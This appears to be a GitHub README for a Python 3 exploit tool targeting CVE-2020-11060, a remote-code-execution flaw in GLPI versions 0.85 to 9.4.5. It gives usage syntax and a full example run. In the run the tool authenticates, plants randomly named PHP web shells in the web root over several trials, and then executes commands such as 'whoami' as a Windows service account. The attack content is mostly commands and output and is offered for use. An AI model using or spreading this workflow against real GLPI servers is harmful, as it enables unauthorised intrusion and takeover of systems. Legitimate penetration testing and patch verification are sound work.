# CVE-2020-11060

This script is a Python 3.x based exploit for CVE-2020-11060 in GLPI versions 0.85-9.4.5.

Original implementation: [0xdreadnaught](https://github.com/0xdreadnaught)

Python3 refactoring: [n3rada](https://github.com/n3rada)

The original [PoC](https://www.exploit-db.com/exploits/49992) in ExploitDB is now deprecated since it used Python 2.x. The new version has been submitted, and a link will be added here if/when it's accepted.
The original vulnerability research used to build these PoCs conducted by [AlmondOffSec](https://github.com/AlmondOffSec), and can be found [here](https://offsec.almond.consulting/playing-with-gzip-rce-in-glpi.html).


## Usage

```python
python3 CVE-2020-11060.py --url 'http://<target URL>' --user <'user'> --password <'password'> --platform <win/nix> --offset <#>
```

## Example Output

```text
python3 CVE-2020-11060.py --url 'http://glpi.vul.ne' --user 'glpi_adm' --password 'Amvfd6565/432' --platform 'win' --offset 312

[+] GLPI Browser targeting 'http://glpi.vul.ne' ('windows') with following credentials: 'glpi_adm':'Amvfd6565/432'.
[+] Target is up and responding.
[+] User 'glpi_adm' is logged in.
------------------------- trial number 1 -------------------------
[*] Wiping networks...
        Deleting network id: 2413
[+] Network created
[+] Modifying network
        New ESSID: RCEe
[+] Current shellname: bQznfdTr.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\bQznfdTr.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/bQznfdTr.php
[+] Shell size: 265
------------------------- trial number 2 -------------------------
[*] Wiping networks...
        Deleting network id: 2414
[+] Network created
[+] Modifying network
        New ESSID: RCEee
[+] Current shellname: HdqrmKtR.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\HdqrmKtR.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/HdqrmKtR.php
[+] Shell size: 13882
------------------------- trial number 3 -------------------------
[*] Wiping networks...
        Deleting network id: 2415
[+] Network created
[+] Modifying network
        New ESSID: RCEeee
[+] Current shellname: dwmfIJgN.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\dwmfIJgN.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/dwmfIJgN.php
[+] Shell size: 13885
------------------------- trial number 4 -------------------------
[*] Wiping networks...
        Deleting network id: 2416
[+] Network created
[+] Modifying network
        New ESSID: RCEeeee
[+] Current shellname: KmGsYHBw.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\KmGsYHBw.php
[+] File 'dumped', accessible at: http://glpi.vul.ne/sound/KmGsYHBw.php
[+] Shell size: 8369
------------------------------------------------------------------
[+] RCE found after 4 trials!
[+] You can execute command remotely as: nt authority\network service@WIN03
[+] Run this tool again with the desired command to inject:
        python3 CVE-2020-11060.py --url 'http://glpi.vul.ne/sound/KmGsYHBw.php' --command 'desired_command_here'
```

After that, you can execute a command freely like:
```python
python3 CVE-2020-11060.py --url 'http://glpi.vul.ne/sound/KmGsYHBw.php' --command 'whoami'
```

And it will return:
```text
[*] Response received from 'http://glpi.vul.ne/sound/KmGsYHBw.php':

nt authority\network service
```
